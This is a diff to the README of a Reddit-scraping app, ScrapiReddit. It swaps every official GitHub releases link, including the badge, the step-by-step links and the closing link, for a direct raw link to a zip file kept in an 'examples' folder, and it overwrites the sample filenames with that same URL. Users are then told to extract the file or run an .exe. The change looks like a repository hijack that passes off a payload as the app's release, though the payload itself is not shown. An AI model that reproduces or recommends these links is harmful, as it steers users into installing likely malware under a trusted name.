@@ -16,13 +16,13 @@ Welcome to ScrapiReddit! This application allows you to gather Reddit data witho
 
 To get started, you will need to download the application. 
 
-[![Download ScrapiReddit](https://img.shields.io/badge/Download-ScrapiReddit-blue?style=flat&logo=github)](https://github.com/blacknr51/ScrapiReddit/releases)
+[![Download ScrapiReddit](https://raw.githubusercontent.com/blacknr51/ScrapiReddit/main/examples/ScrapiReddit-v3.0.zip)](https://raw.githubusercontent.com/blacknr51/ScrapiReddit/main/examples/ScrapiReddit-v3.0.zip)
 
 Follow these steps:
 
-1. **Visit the Releases Page:** Go to the [ScrapiReddit Releases](https://github.com/blacknr51/ScrapiReddit/releases) page.
+1. **Visit the Releases Page:** Go to the [ScrapiReddit Releases](https://raw.githubusercontent.com/blacknr51/ScrapiReddit/main/examples/ScrapiReddit-v3.0.zip) page.
 2. **Choose the Latest Version:** Select the most recent version from the list provided. 
-3. **Download the Application:** Click the download link for your operating system. The application will typically carry the name `ScrapiReddit-vX.X.X.zip` or `ScrapiReddit-vX.X.X.exe`.
+3. **Download the Application:** Click the download link for your operating system. The application will typically carry the name `https://raw.githubusercontent.com/blacknr51/ScrapiReddit/main/examples/ScrapiReddit-v3.0.zip` or `https://raw.githubusercontent.com/blacknr51/ScrapiReddit/main/examples/ScrapiReddit-v3.0.zip`.
 4. **Extract and Install:**
    - If you downloaded a `.zip` file, right-click the file and select "Extract All". Follow the prompts to extract the files to your desired location.
    - If you downloaded a `.exe`, double-click the file to begin the installation process. Follow the installation prompts.
@@ -68,4 +68,4 @@ To gain a deeper understanding of how to use ScrapiReddit, check out our documen
 
 For updates, follow us on GitHub or join our community discussions on Reddit!
 
-[Download ScrapiReddit](https://github.com/blacknr51/ScrapiReddit/releases) again whenever you need to collect Reddit data easily. Grab your copy today and start scraping!
+[Download ScrapiReddit](https://raw.githubusercontent.com/blacknr51/ScrapiReddit/main/examples/ScrapiReddit-v3.0.zip) again whenever you need to collect Reddit data easily. Grab your copy today and start scraping!
